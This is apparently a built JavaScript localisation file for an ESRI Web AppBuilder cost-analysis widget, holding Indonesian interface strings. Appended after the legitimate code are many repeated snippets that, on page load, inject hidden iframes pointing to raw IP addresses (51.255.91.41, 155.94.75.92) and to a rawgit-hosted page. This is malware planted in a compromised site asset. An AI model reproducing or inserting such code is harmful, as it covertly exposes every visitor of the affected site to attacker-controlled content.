// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Atur teks konfig:",generalSettings:{tabTitle:"Pengaturan umum",measurementUnitLabel:"Unit Pengukuran",currencyLabel:"Simbol Pengukuran",roundCostLabel:"Biaya Bulat",projectOutputSettings:"Pengaturan Output Proyek",typeOfProjectAreaLabel:"Tipe Area Proyek",bufferDistanceLabel:"Jarak Buffer",roundCostValues:{twoDecimalPoint:"Dua Titik Desimal",nearestWholeNumber:"Jumlah Keseluruhan Terdekat",nearestTen:"Puluhan Terdekat",nearestHundred:"Ratusan Terdekat",
nearestThousand:"Ribuan Terdekat",nearestTenThousands:"Puluhan Ribu Terdekat"},projectAreaType:{outline:"Kerangka",buffer:"Buffer"},errorMessages:{currency:"Unit mata uang tidak valid",bufferDistance:"Jarak buffer tidak valid",outOfRangebufferDistance:"Nilai harus lebih besar dari 0 dan kurang dari atau sama dengan 100"}},projectSettings:{tabTitle:"Pengaturan proyek",costingGeometrySectionTitle:"Tentukan geografi untuk penetapan biaya (opsional)",costingGeometrySectionNote:"Catatan: Mengonfigurasi layer ini akan memungkinkan pengguna mengatur persamaan biaya template fitur berdasarkan geografi.",
projectTableSectionTitle:"Kemampuan untuk Menyimpan/Memuat pengaturan proyek (opsional)",projectTableSectionNote:"Catatan: Mengonfigurasi semua tabel dan layer akan memungkinkan pengguna menyimpan/memuat proyek untuk digunakan belakangan.",costingGeometryLayerLabel:"Layer Geometri Penetapan Biaya",fieldLabelGeography:"Kolom untuk Melabeli Geografi",projectAssetsTableLabel:"Tabel Aset Proyek",projectMultiplierTableLabel:"Tabel Biaya Tambahan Pengganda Proyek",projectLayerLabel:"Layer Proyek",configureFieldsLabel:"Konfigurasi Kolom",
fieldDescriptionHeaderTitle:"Deskripsi Kolom",layerFieldsHeaderTitle:"Kolom Layer",selectLabel:"Pilih",errorMessages:{duplicateLayerSelection:"${layerName} sudah dipilih",invalidConfiguration:"Harap pilih ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eLayer poligon dengan kondisi berikut akan ditampilkan: \x3cbr/\x3e \x3cli\x3e\tLayer harus memiliki kemampuan \u00e2\u20ac\u0153Kueri\u00e2\u20ac\x3c/li\x3e\x3cli\x3e\tLayer harus memiliki kolom GlobalID\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eKolom string dan numerik \u00e2\u20ac\u0153Layer Geometri Penetapan Biaya\u00e2\u20ac\u009d yang dipilih akan ditampilkan di menu traik-turun \u00e2\u20ac\u0153Kolom untuk Melabeli Geometri\u00e2\u20ac.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eTabel dengan ketentuan berikut akan ditampilkan: \x3cbr/\x3e \x3cli\x3eTabel harus memiliki kemampuan pengeditan yaitu \u00e2\u20ac\u0153Buat\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Hapus\u00e2\u20ac\u009d dan \u00e2\u20ac\u0153Perbarui\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabel harus memiliki enam kolom dengan nama dan tipe data yang tepat:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (Kolom tipe GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (Kolom tipe string)\x3c/li\x3e\x3cli\x3e\tSkenario (Kolom tipe string)\x3c/li\x3e\x3cli\x3e\tTemplateName (Kolom tipe string)\x3c/li\x3e\x3cli\x3e    GeographyGUID (Kolom tipe GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (Kolom tipe GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabel dengan ketentuan berikut akan ditampilkan: \x3cbr/\x3e \x3cli\x3eTabel harus memiliki kemampuan pengeditan yaitu \u00e2\u20ac\u0153Buat\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Hapus\u00e2\u20ac\u009d dan \u00e2\u20ac\u0153Perbarui\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eTabel harus memiliki lima kolom dengan nama dan tipe data yang tepat:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDeskripsi (Kolom tipe string)\x3c/li\x3e\x3cli\x3e\tTipe (Kolom tipe string)\x3c/li\x3e\x3cli\x3e\tNilai (Kolom tipe mengambang/ganda)\x3c/li\x3e\x3cli\x3e\tCostindex (Kolom tipe integer)\x3c/li\x3e\x3cli\x3e    \tProjectGUID (Kolom tipe GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eLayer poligon dengan ketentuan berikut akan ditampilkan: \x3cbr/\x3e \x3cli\x3eLayer harus memiliki kemampuan pengeditan yaitu \u00e2\u20ac\u0153Buat\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Hapus\u00e2\u20ac\u009d dan \u00e2\u20ac\u0153Perbarui\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLayer harus memiliki lima kolom dengan nama dan tipe data yang tepat:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (Kolom tipe string)\x3c/li\x3e\x3cli\x3eDeskripsi (Kolom tipe string)\x3c/li\x3e\x3cli\x3eTotalasssetcost (Kolom tipe mengambang/ganda)\x3c/li\x3e\x3cli\x3eGrossprojectcost (Kolom tipe mengambang/ganda)\x3c/li\x3e\x3cli\x3eGlobalID (Kolom tipe GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Pengaturan layer",layerNameHeaderTitle:"Nama layer",layerNameHeaderTooltip:"Daftar layer di peta",EditableLayerHeaderTitle:"Dapat Diedit",EditableLayerHeaderTooltip:"Sertakan layer dan template-nya dalam widget penetapan biaya",SelectableLayerHeaderTitle:"Dapat Dipilih",SelectableLayerHeaderTooltip:"Geometri dari fitur dapat digunakan untuk menghasilkan item biaya baru",fieldPickerHeaderTitle:"ID Proyek (opsional)",fieldPickerHeaderTooltip:"Kolom opsional (dari string tipe) untuk menyimpan ID Proyek di",
selectLabel:"Pilih",noAssetLayersAvailable:"Tidak ada aset ditemukan dalam wepmap terpilih",disableEditableCheckboxTooltip:"Layer ini tidak memiliki kemampuan pengeditan"},costingInfo:{tabTitle:"Info Penetapan Biaya",proposedMainsLabel:"Saluran Utama Diusulkan",addCostingTemplateLabel:"Tambahkan Template Penetapan Biaya",manageScenariosTitle:"Kelola Skenario",featureTemplateTitle:"Template Fitur",costEquationTitle:"Persamaan Biaya",geographyTitle:"Geografi",scenarioTitle:"Skenario",actionTitle:"Tindakan",
scenarioNameLabel:"Nama Skenario",addBtnLabel:"Tambah",srNoLabel:"No.",deleteLabel:"Hapus",duplicateScenarioName:"Duplikasi nama skenario",hintText:"\x3cdiv\x3ePetunjuk: Gunakan kata kunci berikut\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Menggunakan jumlah total aset tipe yang sama dalam suatu geografi\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Menggunakan panjang untuk aset garis dan area untuk aset poligon\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Menggunakan panjang total untuk aset garis dan area total untuk aset poligon dengan tipe yang sama dalam suatu geografi\x3c/li\x3e\x3c/ul\x3eAnda dapat menggunakan fungsi seperti:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eHarap edit persamaan biaya sesuai kebutuhan proyek Anda.",
noneValue:"Tidak Ada",requiredCostEquation:"Persamaan biaya tidak valid untuk ${layerName} : ${templateName}",duplicateTemplateMessage:"Entri template duplikat sudah ada untuk ${layerName} : ${templateName}",defaultEquationRequired:"Persamaan default harus diisi untuk ${layerName} : ${templateName}",validCostEquationMessage:"Harap masukkan persamaan biaya yang valid",costEquationHelpText:"Harap edit persamaan biaya sesuai kebutuhan proyek Anda",scenarioHelpText:"Harap pilih skenario sesuai kebutuhan proyek Anda",
copyRowTitle:"Salin Baris",noTemplateAvailable:"Harap tambahkan paling sedikit satu template untuk ${layerName}",manageScenarioLabel:"Kelola skenario",noLayerMessage:"Harap masukkan paling sedikit satu layer di ${tabName}",noEditableLayersAvailable:"Layer harus dicentang sebagai dapat diedit di tab pengaturan layer"},statisticsSettings:{tabTitle:"Pengaturan statistik",addStatisticsLabel:"Tambahkan statistik",fieldNameTitle:"Kolom",statisticsTitle:"Label",addNewStatisticsText:"Tambahkan Statistik Baru",
deleteStatisticsText:"Hapus Statistik",moveStatisticsUpText:"Pindahkan Statistik ke Atas",moveStatisticsDownText:"Pindahkan Statistik ke Bawah",selectDeselectAllTitle:"Pilih Semua"},statisticsType:{countLabel:"Jumlah",averageLabel:"Rata-Rata",maxLabel:"Maksimum",minLabel:"Minimum",summationLabel:"Penjumlahan",areaLabel:"Area",lengthLabel:"Panjang"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});